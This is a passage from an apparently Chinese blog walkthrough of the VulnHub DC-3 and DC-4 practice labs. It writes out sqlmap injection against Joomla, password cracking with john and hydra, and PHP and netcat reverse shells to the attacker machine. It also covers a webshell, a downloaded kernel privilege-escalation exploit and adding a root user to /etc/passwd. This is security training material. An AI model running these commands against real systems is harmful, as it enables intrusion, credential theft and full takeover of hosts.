<p>然后可以看到<code>#__users</code>的表，里面很可能有线索</p>
<blockquote>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T &quot;#__users&quot; --columns</code></p>
<p>&#x2F;&#x2F;和上一步类似，但注意表名有#，所以需要用引号框起来，不然后面语句全被注释了<br>&#x2F;&#x2F;*注，sqlmap提示按默认推荐就好</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903131111592.png"><img src="/vulnhub/image-20220903131111592.png" alt="image-20220903131111592"></a></p>
<p>看到<code>username</code>和<code>password</code>，查看列里内容</p>
<blockquote>
<p><code>sqlmap -u &quot;http://localhost/index.php?option=com_fields&amp;view=fields&amp;layout=modal&amp;list[fullordering]=updatexml&quot; --risk=3 --level=5 --random-agent --dbs -p list[fullordering] -D joomladb -T &quot;#__users&quot; -C username,password --dump</code><br>&#x2F;&#x2F;dump获取字段中的数据</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903133516906.png"><img src="/vulnhub/image-20220903133516906.png" alt="image-20220903133516906"></a></p>
<p>得到用户名和密码</p>
<p>但是密码被加密了，那就只能用一些工具进行解密</p>
<p>先生成一个加密密码的文本文件</p>
<blockquote>
<p>输入<code>vi passwd.txt</code><br>然后把加密数据复制进去<br><code>$2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903134307088.png"><img src="/vulnhub/image-20220903134307088.png" alt="image-20220903134307088"></a></p>
<h2 id="john"><a href="#john" class="headerlink" title="john"></a>john</h2><p>然后我们就需要用一个解密工具<code>john</code></p>
<p><code>John</code>是一个破解系统密码的工具</p>
<p>使用很简单</p>
<blockquote>
<p>输入<code>john passwd.txt</code></p>
<p>&#x2F;&#x2F;后面接的是密码文本文件</p>
</blockquote>
<p>然后输入</p>
<blockquote>
<p><code>john --show passwd.txt</code><br>&#x2F;&#x2F;查看爆破成功的密码，发现爆破成功</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903140126704.png"><img src="/vulnhub/image-20220903140126704.png" alt="image-20220903140126704"></a></p>
<p>得到密码<code>snoopy</code></p>
<p>然后登录后台网址</p>
<blockquote>
<p>用户名：<code>admin</code><br>密码：<code>snoopy</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903140604935.png"><img src="/vulnhub/image-20220903140604935.png" alt="image-20220903140604935"></a></p>
<p>登录成功，然后摸索分析一下网站</p>
<p>然后在<code>Extensions</code>–&gt;<code>Template</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903142609240.png"><img src="/vulnhub/image-20220903142609240.png" alt="image-20220903142609240"></a></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903142440563.png"><img src="/vulnhub/image-20220903142440563.png" alt="image-20220903142440563"></a></p>
<p>发现有个<code>new file</code>，可以新建文件，那么我们也可以新建一个我们的木马文件，拿取靶机的<code>shell</code></p>
<h2 id="后门生成，进入shell"><a href="#后门生成，进入shell" class="headerlink" title="后门生成，进入shell"></a>后门生成，进入shell</h2><h3 id="法1"><a href="#法1" class="headerlink" title="法1"></a>法1</h3><p><strong>msfvenom</strong></p>
<h4 id="msf生成木马"><a href="#msf生成木马" class="headerlink" title="msf生成木马"></a>msf生成木马</h4><blockquote>
<p>输入<code>msfvenom -p php/meterpreter/reverse_tcp LHOST=kali的ip LPORT=4444 -f raw &gt; shell.php</code><br>&#x2F;&#x2F;注意，LHOST是kali的ip</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903222910397.png"><img src="/vulnhub/image-20220903222910397.png" alt="image-20220903222910397"></a></p>
<blockquote>
<p>输入<code>ls</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903144052531.png"><img src="/vulnhub/image-20220903144052531.png" alt="image-20220903144052531"></a></p>
<p>发现目录下生成了 <code>shell.php</code></p>
<blockquote>
<p>输入<code>cat shell.php</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903223007361.png"><img src="/vulnhub/image-20220903223007361.png" alt="image-20220903223007361"></a></p>
<p>得到靶机对应的木马</p>
<p>然后在网站新建一个<code>php</code>文件</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903221145987.png"><img src="/vulnhub/image-20220903221145987.png" alt="image-20220903221145987"></a></p>
<p>然后把木马内容导入进去</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903223039265.png"><img src="/vulnhub/image-20220903223039265.png" alt="image-20220903223039265"></a></p>
<p> 然后保存一下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903221243628.png"><img src="/vulnhub/image-20220903221243628.png" alt="image-20220903221243628"></a></p>
<p>然后我们就需要找到木马文件路径，进行访问看看，能不能访问成功</p>
<p>因为我们文件是在<code>/templates/protostar/</code>下上传的，所以访问</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.139</span>/templates/protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903221340927.png"><img src="/vulnhub/image-20220903221340927.png" alt="image-20220903221340927"></a></p>
<p>看到<code>/*</code>，看来是可以成功访问</p>
<h5 id="msf利用木马"><a href="#msf利用木马" class="headerlink" title="msf利用木马"></a>msf利用木马</h5><p>然后用<code>msf</code>进行利用</p>
<blockquote>
<p>先输入<code>msfconsole</code>，进入msf</p>
</blockquote>
<blockquote>
<p>然后输入<br><code>use exploit/multi/handler</code></p>
<p><code>set payload php/meterpreter/reverse_tcp</code><br>进入我们利用msf制作的木马利用环境</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903220102252.png"><img src="/vulnhub/image-20220903220102252.png" alt="image-20220903220102252"></a></p>
<blockquote>
<p>输入<code>show options</code><br>看看需要填写什么</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903220250819.png"><img src="/vulnhub/image-20220903220250819.png" alt="image-20220903220250819"></a></p>
<p>看到LHOST监听的ip没有填写</p>
<blockquote>
<p>输入<code>set LHOST 192.168.133.140</code>  &#x2F;&#x2F;kali的ip</p>
</blockquote>
<blockquote>
<p>输入<code>run</code>，运行</p>
</blockquote>
<p>这里就是在等待我们的木马运行，我们只需要刷新一下我们之前访问木马的网页</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.139</span>/templates/protostar/<span class="number">1</span>.php</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903223440029.png"><img src="/vulnhub/image-20220903223440029.png" alt="image-20220903223440029"></a></p>
<p>然后输入</p>
<blockquote>
<p>输入<code>shell</code></p>
<p>然后输入<code>python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</code><br>&#x2F;&#x2F;进入交互式shell，当然不嫌看着麻烦，也可以直接执行后面命令</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903223812256.png"><img src="/vulnhub/image-20220903223812256.png" alt="image-20220903223812256"></a></p>
<h5 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h5><blockquote>
<p>输入<code>ls</code>,简单看看文件</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220903224116654.png"><img src="/vulnhub/image-20220903224116654.png" alt="image-20220903224116654"></a></p>
<blockquote>
<p>输入<code>uname -a</code><br>查看系统版本</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904082811177.png"><img src="/vulnhub/image-20220904082811177.png" alt="image-20220904082811177"></a></p>
<p>看到<code>unbuntu</code>是<code>2016</code>年<code>4</code>月发布的，所以是<code>unbuntu16.04</code></p>
<p><code>linux</code>版本是<code>4.4.0-21</code>版</p>
<p>所以根据这个版本看看有没有可以利用的漏洞，来方便我们提权</p>
<blockquote>
<p>还是利用之前用过的<br><code>searchsploit unbuntu 16.04</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904093243588.png"><img src="/vulnhub/image-20220904093243588.png" alt="image-20220904093243588"></a></p>
<p><strong>double-fdput()</strong> ,这是运行可执行文件，即可获取<code>root</code>权限</p>
<p>我们把它内容显示出来</p>
<blockquote>
<p>输入<code>searchsploit -p 39772</code>显示文本路径<br>   <code>cat /usr/share/exploitdb/exploits/linux/local/39772.txt</code> 显示内容</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904093849189.png"><img src="/vulnhub/image-20220904093849189.png" alt="image-20220904093849189"></a></p>
<p>在最后看到该漏洞利用的<code>exp</code>下载链接</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904095521748.png"><img src="/vulnhub/image-20220904095521748.png" alt="image-20220904095521748"></a></p>
<p>下载最后一个链接的压缩包</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//gi</span>thub.com<span class="regexp">/offensive-security/</span>exploitdb-bin-sploits<span class="regexp">/raw/m</span>aster<span class="regexp">/bin-sploits/</span><span class="number">39772</span>.zip</span><br></pre></td></tr></table></figure>

<p>然后在我们的网站后台上传上去，和创建木马文件时候一样</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904101055473.png"><img src="/vulnhub/image-20220904101055473.png" alt="image-20220904101055473"></a></p>
<p>结果报错了</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904101159692.png"><img src="/vulnhub/image-20220904101159692.png" alt="image-20220904101159692"></a></p>
<p>看来这个网站上传处是不能上传压缩包文件的</p>
<p>所以我们只能用工具进行直接上传了，比如蚁剑或者菜刀等工具</p>
<p>我们和之前一样新建一个<code>php</code>文件写上我们的一句话木马</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904101711601.png"><img src="/vulnhub/image-20220904101711601.png" alt="image-20220904101711601"></a></p>
<p>用蚁剑连接</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://<span class="number">192.168.133.139</span>/templates/protostar/<span class="number">123</span>.php</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904101700569.png"><img src="/vulnhub/image-20220904101700569.png" alt="image-20220904101700569"></a></p>
<p>然后把我们的压缩包放在目录下</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904112832628.png"><img src="/vulnhub/image-20220904112832628.png" alt="image-20220904112832628"></a></p>
<p>然后返回<code>msf</code></p>
<blockquote>
<p>输入<code>ls</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904112929091.png"><img src="/vulnhub/image-20220904112929091.png" alt="image-20220904112929091"></a></p>
<p>发现压缩包已经在里面了</p>
<p>然后解压缩</p>
<blockquote>
<p>输入<code>unzip 39772.zip</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904113114803.png"><img src="/vulnhub/image-20220904113114803.png" alt="image-20220904113114803"></a></p>
<p>发现目录下多了个<code>39772</code>的目录</p>
<blockquote>
<p>输入<code>cd 39772</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904113213562.png"><img src="/vulnhub/image-20220904113213562.png" alt="image-20220904113213562"></a></p>
<p>发现有两个压缩包，我们利用<code>exploit.tar</code></p>
<blockquote>
<p>输入<code>tar -xvf exploit.tar</code> &#x2F;&#x2F;解压缩</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904113439714.png"><img src="/vulnhub/image-20220904113439714.png" alt="image-20220904113439714"></a></p>
<p>发现多了个<code>ebpf_mapfd_doubleput_exploit</code>目录</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入<span class="built_in">cd</span> ebpf_mapfd_doubleput_exploit</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904113541560.png"><img src="/vulnhub/image-20220904113541560.png" alt="image-20220904113541560"></a></p>
<p>发现有个<code>compile.sh</code></p>
<p>运行</p>
<blockquote>
<p>输入<code>./compile.sh</code></p>
</blockquote>
<p>发现目录下有多了一个<code>doubleput</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904113730537.png"><img src="/vulnhub/image-20220904113730537.png" alt="image-20220904113730537"></a></p>
<p>这就是提权文件，运行一下</p>
<blockquote>
<p>输入<code>./doupleput</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904114028987.png"><img src="/vulnhub/image-20220904114028987.png" alt="image-20220904114028987"></a></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">输入<span class="built_in">whoami</span>，看看提权成功没</span><br></pre></td></tr></table></figure>

<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904114119370.png"><img src="/vulnhub/image-20220904114119370.png" alt="image-20220904114119370"></a></p>
<p>提权成功</p>
<p>然后我们到<code>/root</code>目录下查看 <code>flag</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904114212223.png"><img src="/vulnhub/image-20220904114212223.png" alt="image-20220904114212223"></a></p>
<hr>
<blockquote>
<figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\ \      / /__|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  _ \  ___  _ __   ___</span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line"> \ \ /\ / / _ \ |<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">/ _ \</span>|<span class="string"> &#x27;_ \ / _ \ </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|</span><br><span class="line">  \ V  V /  __/ |<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string"> (_) </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string"> </span>|<span class="string">  __/_</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">_</span>|</span><br><span class="line">   \_/\_/ \___|<span class="string">_</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">____/ \___/</span>|<span class="string">_</span>|<span class="string"> </span>|<span class="string">_</span>|<span class="string">\___(_</span>|<span class="string">_</span>|<span class="string">_</span>|<span class="string">_)</span></span><br></pre></td></tr></table></figure>

<p><code>Congratulations are in order.  :-)</code></p>
<p><code>I hope you&#39;ve enjoyed this challenge as I enjoyed making it.</code></p>
<p><code>If there are any ways that I can improve these little challenges,</code><br><code>please let me know.</code></p>
<p><code>As per usual, comments and complaints can be sent via Twitter to @DCAU7</code></p>
<p><code>Have a great day!!!!</code></p>
<p>意思是：</p>
<p>恭喜你，一切正常。：-）</p>
<p>我希望你和我一样喜欢这个挑战。</p>
<p>如果有任何方法可以改善这些小挑战，</p>
<p>请让我知道。</p>
<p>如往常一样，评论和投诉可以通过Twitter发送到@DCAU7</p>
<p>祝你有美好的一天！！！！</p>
</blockquote>
<p><strong>一个旗子找完，游戏结束</strong></p>
<h3 id="法2"><a href="#法2" class="headerlink" title="法2"></a>法2</h3><h4 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a><strong>反弹shell</strong></h4><blockquote>
<p>反弹shell，就是控制端监听在某TCP&#x2F;UDP端口，被控端发起请求到该端口，并将其命令行的输入输出转到控制端。</p>
<p>通俗点说，反弹shell就是一种反向链接，与正向的ssh等不同，它是在对方电脑执行命令连接到我方的攻击模式，并且这种攻击模式必须搭配远程执行命令漏洞来使用。</p>
<p>由于防火墙等限制，对方机器只能发送请求，不能接收请求</p>
<p>对于病毒，木马，受害者什么时候能中招，对方的网络环境是什么样的，什么时候开关机，都是未知，建立一个服务端，让恶意程序主动连接，才是上策。</p>
</blockquote>
<p>和法一一样，我们需要写一个反弹<code>shell</code>的<code>php</code>文件</p>
<blockquote>
<p><code>&lt;?php system(&quot;bash -c &#39;bash -i &gt;&amp; /dev/tcp/192.168.133.140/8888 0&gt;&amp;1&#39;&quot;);?&gt;</code></p>
<p>&#x2F;&#x2F;注意这里的ip为kali的ip，8888为监听的端口</p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904115013063.png"><img src="/vulnhub/image-20220904115013063.png" alt="image-20220904115013063"></a></p>
<blockquote>
<p>输入<code>nc -lnvp 8888</code>开始监听<br>然后访问<code>456.php</code><br><code>http://192.168.133.139/templates/protostar/456.php</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904130847588.png"><img src="/vulnhub/image-20220904130847588.png" alt="image-20220904130847588"></a></p>
<p>拿到<code>shell</code>，后面提权和法一</p>
<p>一样</p>
<h3 id="法3"><a href="#法3" class="headerlink" title="法3"></a>法3</h3><h4 id="weevely【提权没回显】"><a href="#weevely【提权没回显】" class="headerlink" title="weevely【提权没回显】"></a><strong>weevely</strong>【提权没回显】</h4><blockquote>
<p><code>Weevely</code>是一款使用python编写的webshell工具,集webshell生成和连接于一身,采用c&#x2F;s模式 构建,可以算作是linux下的一款php菜刀替代工具</p>
</blockquote>
<p>生成<code>Shell</code></p>
<blockquote>
<p><code>weevely generate  &lt;文件名&gt;</code></p>
<p><code>weevely generate 123456 shell.php</code></p>
</blockquote>
<p>把生成的内容，复制到我们创建的<code>789.php</code>文件里，和前面两个方法步骤一样</p>
<p>利用触发<code>shell</code></p>
<blockquote>
<p><code>weevely http://192.168.133.139/templates/protostar/789.php 123456</code></p>
<p><code>python -m http.server 9999</code>   </p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904133118746.png"><img src="/vulnhub/image-20220904133118746.png" alt="image-20220904133118746"></a></p>
<p>成功进入<code>shell</code></p>
<p>但是当执行提权时</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220904135935922.png"><img src="/vulnhub/image-20220904135935922.png" alt="image-20220904135935922"></a></p>
<p>报错无法提权，看来是被过滤啥的</p>
<hr>
<h1 id="四、DC-4-初级"><a href="#四、DC-4-初级" class="headerlink" title="四、DC-4[初级]"></a>四、DC-4[初级]</h1><p><strong>only one flag</strong></p>
<h2 id="信息收集-3"><a href="#信息收集-3" class="headerlink" title="信息收集"></a>信息收集</h2><p>先看看靶机端口运行的服务</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918190610478.png"><img src="/vulnhub/image-20220918190610478.png" alt="image-20220918190610478"></a></p>
<p>发现有<code>22</code>和<code>80</code>端口，分别运行<code>ssh</code>和<code>http</code></p>
<p>我们先访问<code>80</code>端口</p>
<blockquote>
<p>访问ip：<code>192.168.133.141</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918190945726.png"><img src="/vulnhub/image-20220918190945726.png" alt="image-20220918190945726"></a></p>
<p>是一个基本的登录窗口，有提示是<code>admin</code>用户登录界面，所以<strong>可能需要密码爆破登录</strong></p>
<p>我们再利用<code>wappalyzer</code>看一下网站一些基本信息</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918194402321.png"><img src="/vulnhub/image-20220918194402321.png" alt="image-20220918194402321"></a></p>
<p>没有啥有用的信息</p>
<h2 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h2><p>然后我们就开始进行密码爆破</p>
<p>已知用户名为<code>admin</code>，只用对密码爆破</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918202233098.png"><img src="/vulnhub/image-20220918202233098.png" alt="image-20220918202233098"></a></p>
<p>【字典可以自己找，当然也可以看我学习笔记写的网站下载】</p>
<p>这里我用的<code>top2000.txt</code></p>
<p>最后爆破出密码为<code>happy</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918203225520.png"><img src="/vulnhub/image-20220918203225520.png" alt="image-20220918203225520"></a></p>
<p>登录试试</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918204147349.png"><img src="/vulnhub/image-20220918204147349.png" alt="image-20220918204147349"></a></p>
<p>登录成功，进入<code>Command</code></p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918204230810.png"><img src="/vulnhub/image-20220918204230810.png" alt="image-20220918204230810"></a></p>
<p>点击<code>run</code>，就会显示上面的数据，看来是命令执行，但是它默认是<code>ls -l</code>，我们试试抓包能修改请求包里的命令吗</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918204413877.png"><img src="/vulnhub/image-20220918204413877.png" alt="image-20220918204413877"></a></p>
<p>发现是可以修改的，我们试试<code>whoami</code>命令，看看当前网站登录用户权限</p>
<blockquote>
<p>输入<code>whoami</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918204514149.png"><img src="/vulnhub/image-20220918204514149.png" alt="image-20220918204514149"></a></p>
<p>发现是普通用户权限</p>
<p>下面是两个<code>getshell</code>的思路</p>
<hr>
<p><strong>1.</strong></p>
<p>后续查询操作，因为我们可以执行命令，所以也可以利用<code>nc</code><strong>反弹shell</strong>，同样也可以找到用户目录信息</p>
<blockquote>
<p>终端输入<code>nc -l -vv -p 8888</code>，监听8888端口</p>
</blockquote>
<p>抓包数据命令修改为</p>
<blockquote>
<p><code>nc -nv 192.168.133.140 8888 -e /bin/bash</code>   &#x2F;&#x2F;<code>192.168.133.140</code>是虚拟机ip，不是靶机ip</p>
</blockquote>
<p>然后终端就可以执行后续执行命令的类似操作，就是执行的时候可能稍微方便一些</p>
<hr>
<p><strong>2.</strong></p>
<p>我们修改命令，查询<code>/etc/passwd</code>文档（记录每个用户的信息，方便管理员对用户的管理的一个文档）</p>
<blockquote>
<p>输入<code>cat+/etc/passwd</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918205535912.png"><img src="/vulnhub/image-20220918205535912.png" alt="image-20220918205535912"></a></p>
<p>发现有三个用户</p>
<blockquote>
<p><code>charles</code><br><code>jim</code><br><code>sam</code></p>
</blockquote>
<p>我们查看这几个用户的目录下有没有我们需要的信息</p>
<p>先访问<code>charles</code></p>
<blockquote>
<p>输入<code>ls+-a+/home/charles</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918211049263.png"><img src="/vulnhub/image-20220918211049263.png" alt="image-20220918211049263"></a></p>
<p>感觉没啥有用的信息</p>
<p>再看看<code>jim</code></p>
<blockquote>
<p>输入<code>ls+-a+/home/jim</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918211159526.png"><img src="/vulnhub/image-20220918211159526.png" alt="image-20220918211159526"></a></p>
<p>发现关键信息， <code>backups</code>目录和<code>mbox</code>目录，<code>test.sh</code>里面我看了，没啥有用的信息</p>
<p>先看<code>backups</code>目录</p>
<blockquote>
<p>输入<code>ls+-a+/home/jim/backups</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918211855793.png"><img src="/vulnhub/image-20220918211855793.png" alt="image-20220918211855793"></a></p>
<p>发现有个<code>old-passwords.bak</code>，这个可能就是登录这三个用户的关键</p>
<p>查看一下内容</p>
<blockquote>
<p>输入<code>cat+/home/jim/old-passwords.bak</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918212107439.png"><img src="/vulnhub/image-20220918212107439.png" alt="image-20220918212107439"></a></p>
<p>发现是一个密码表，复制到一个文本文件，当作爆破的密码表</p>
<h2 id="hydra对三用户进行ssh爆破"><a href="#hydra对三用户进行ssh爆破" class="headerlink" title="hydra对三用户进行ssh爆破"></a>hydra对三用户进行ssh爆破</h2><p>我们已经有了密码表<code>（pd.txt）</code>,我们再把三个用户名写到另一个文档里<code>（un.txt）</code></p>
<p>因为之前我们扫描知道，<code>22</code>端口运行着<code>ssh</code>，而<code>80</code>端口我们已经访问了，所以下面端口写<code>22</code></p>
<p>于是</p>
<blockquote>
<p>输入<code>hydra -L un.txt -P pd.txt 192.168.133.141 ssh -s 22</code></p>
</blockquote>
<p>有点久，等一会就行</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918214254623.png"><img src="/vulnhub/image-20220918214254623.png" alt="image-20220918214254623"></a></p>
<p>得到<code>jim</code>用户的密码</p>
<blockquote>
<p><code>jibril04</code></p>
</blockquote>
<p>然后我们登录<code>ssh</code></p>
<blockquote>
<p>输入<code>ssh jim@192.168.133.141 -p 22</code></p>
</blockquote>
<p>然后输入密码后，登录成功</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918214519470.png"><img src="/vulnhub/image-20220918214519470.png" alt="image-20220918214519470"></a></p>
<p>我们先看看我们能否执行一些管理员命令</p>
<blockquote>
<p>输入<code>sudo -l</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918215754640.png"><img src="/vulnhub/image-20220918215754640.png" alt="image-20220918215754640"></a></p>
<p>发现<code>jim</code>用户不能执行任何管理员命令，所以不可能在<code>jim</code>用户上进行提权或其他后续操作</p>
<p>我们仔细一些可以看到</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918214603182.png"><img src="/vulnhub/image-20220918214603182.png" alt="image-20220918214603182"></a></p>
<p>说我们有一封邮件，那我们就看看这封用邮件是什么</p>
<p>但我们不知道<code>mail</code>在哪里</p>
<blockquote>
<p>输入<code>find / -name mail</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918215012745.png"><img src="/vulnhub/image-20220918215012745.png" alt="image-20220918215012745"></a></p>
<p>找到位置<code>/var/mail</code></p>
<blockquote>
<p>输入<code>cd /var/mail;ls -a</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918215052934.png"><img src="/vulnhub/image-20220918215052934.png" alt="image-20220918215052934"></a></p>
<p>发现有一封名为<code>jim</code>的邮件，查看信息</p>
<blockquote>
<p>输入<code>cat jim</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918215204901.png"><img src="/vulnhub/image-20220918215204901.png" alt="image-20220918215204901"></a></p>
<p>发现是<code>charles</code>发给<code>jim</code>的邮件</p>
<blockquote>
<p><code>Hi Jim,</code></p>
<p><code>I&#39;m heading off on holidays at the end of today, so the boss asked me to give you my password just in case anything goes wrong.</code></p>
<p><code>Password is:  ^xHhA&amp;hvim0y</code></p>
<p><code>See ya,</code><br><code>Charles</code></p>
<p>翻译：<br>嗨，吉姆，</p>
<p>我今天年底要放假，所以老板让我把密码给你，以防万一。</p>
<p>密码是：^xHhA&amp;hvim0y</p>
<p>再见，<br>查尔斯</p>
</blockquote>
<p>信里提到他自己的密码</p>
<blockquote>
<p><code>^xHhA&amp;hvim0y</code></p>
</blockquote>
<p>于是我们就可以登录<code>charles</code>的账号，所以我们切换用户</p>
<blockquote>
<p>输入<code>su charles</code></p>
</blockquote>
<p>然后输入密码后，登录成功</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918215532470.png"><img src="/vulnhub/image-20220918215532470.png" alt="image-20220918215532470"></a></p>
<p>先看看<code>charles</code>能执行什么管理员命令</p>
<blockquote>
<p>输入<code>sudo -l</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918220005178.png"><img src="/vulnhub/image-20220918220005178.png" alt="image-20220918220005178"></a></p>
<p>发现<code>charles</code>可以执行管理员的<code>teehee</code>命令</p>
<h2 id="teehee"><a href="#teehee" class="headerlink" title="teehee"></a>teehee</h2><p>我们先需要知道这个命令是干什么的</p>
<blockquote>
<p>输入<code>teehee -h</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918220336958.png"><img src="/vulnhub/image-20220918220336958.png" alt="image-20220918220336958"></a></p>
<p><u><strong>发现它是可以修改文件的数据，-a指令能够保证修改文件不会覆盖原有文件</strong></u></p>
<p>那我们需要管理员权限，就可以在<code>/etc/passwd</code>里面添加一个管理员用户数据</p>
<h3 id="添加管理员账户"><a href="#添加管理员账户" class="headerlink" title="添加管理员账户"></a>添加管理员账户</h3><blockquote>
<p>输入<code>sudo teehee -a /etc/passwd</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918221258918.png"><img src="/vulnhub/image-20220918221258918.png" alt="image-20220918221258918"></a></p>
<p>然后就等待我们输入数据</p>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918220824224.png"><img src="/vulnhub/image-20220918220824224.png" alt="image-20220918220824224"></a></p>
<p>按照<code>root</code>用户格式，我们添加自己的数据</p>
<blockquote>
<p>输入<br><code>ttoc:</code>(这里是密码，可以加入自己的哈希后的密码，当然不加就可以直接登录，这里我不加，忽略)<code>:0:0:root:/root:/bin/bash</code></p>
</blockquote>
<p><a data-fancybox="gallery" data-src="/vulnhub/image-20220918221714606.png"><img src="/vulnhub/image-20220918221714606.png" alt="image-20220918221714606"></a></p>
<p>添加成功，我们再看看能不能登录，是不是管理员</p>
